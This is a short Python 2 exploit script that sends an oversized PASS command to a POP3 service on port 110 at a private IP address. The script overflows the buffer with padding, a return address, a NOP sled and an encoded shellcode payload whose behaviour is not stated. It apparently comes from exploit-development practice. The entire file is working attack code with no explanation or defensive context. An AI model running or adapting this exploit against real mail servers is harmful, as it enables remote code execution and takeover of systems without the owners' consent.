#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xba\xc3\xe0\x90\xe6\xd9\xe8\xd9\x74\x24\xf4\x5e\x31\xc9" +
"\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\x95\xee\x72\x13\xe5" +
"\x07\xf0\xdc\x15\xd8\x95\x55\xf0\xe9\x95\x02\x71\x59\x26" +
"\x40\xd7\x56\xcd\x04\xc3\xed\xa3\x80\xe4\x46\x09\xf7\xcb" +
"\x57\x22\xcb\x4a\xd4\x39\x18\xac\xe5\xf1\x6d\xad\x22\xef" +
"\x9c\xff\xfb\x7b\x32\xef\x88\x36\x8f\x84\xc3\xd7\x97\x79" +
"\x93\xd6\xb6\x2c\xaf\x80\x18\xcf\x7c\xb9\x10\xd7\x61\x84" +
"\xeb\x6c\x51\x72\xea\xa4\xab\x7b\x41\x89\x03\x8e\x9b\xce" +
"\xa4\x71\xee\x26\xd7\x0c\xe9\xfd\xa5\xca\x7c\xe5\x0e\x98" +
"\x27\xc1\xaf\x4d\xb1\x82\xbc\x3a\xb5\xcc\xa0\xbd\x1a\x67" +
"\xdc\x36\x9d\xa7\x54\x0c\xba\x63\x3c\xd6\xa3\x32\x98\xb9" +
"\xdc\x24\x43\x65\x79\x2f\x6e\x72\xf0\x72\xe7\xb7\x39\x8c" +
"\xf7\xdf\x4a\xff\xc5\x40\xe1\x97\x65\x08\x2f\x60\x89\x23" +
"\x97\xfe\x74\xcc\xe8\xd7\xb2\x98\xb8\x4f\x12\xa1\x52\x8f" +
"\x9b\x74\xf4\xdf\x33\x27\xb5\x8f\xf3\x97\x5d\xc5\xfb\xc8" +
"\x7e\xe6\xd1\x60\x14\x1d\xb2\x4e\x41\x3d\x60\x27\x90\x3d" +
"\x75\xeb\x1d\xdb\x1f\x03\x48\x74\x88\xba\xd1\x0e\x29\x42" +
"\xcc\x6b\x69\xc8\xe3\x8c\x24\x39\x89\x9e\xd1\xc9\xc4\xfc" +
"\x74\xd5\xf2\x68\x1a\x44\x99\x68\x55\x75\x36\x3f\x32\x4b" +
"\x4f\xd5\xae\xf2\xf9\xcb\x32\x62\xc1\x4f\xe9\x57\xcc\x4e" +
"\x7c\xe3\xea\x40\xb8\xec\xb6\x34\x14\xbb\x60\xe2\xd2\x15" +
"\xc3\x5c\x8d\xca\x8d\x08\x48\x21\x0e\x4e\x55\x6c\xf8\xae" +
"\xe4\xd9\xbd\xd1\xc9\x8d\x49\xaa\x37\x2e\xb5\x61\xfc\x5e" +
"\xfc\x2b\x55\xf7\x59\xbe\xe7\x9a\x59\x15\x2b\xa3\xd9\x9f" +
"\xd4\x50\xc1\xea\xd1\x1d\x45\x07\xa8\x0e\x20\x27\x1f\x2e" +
"\x61")
buffer = "A" * 2606 +"\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
try: 
	print "\nsending buffer"
	s.connect(('192.168.33.86',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not ocnnect to POP3!"
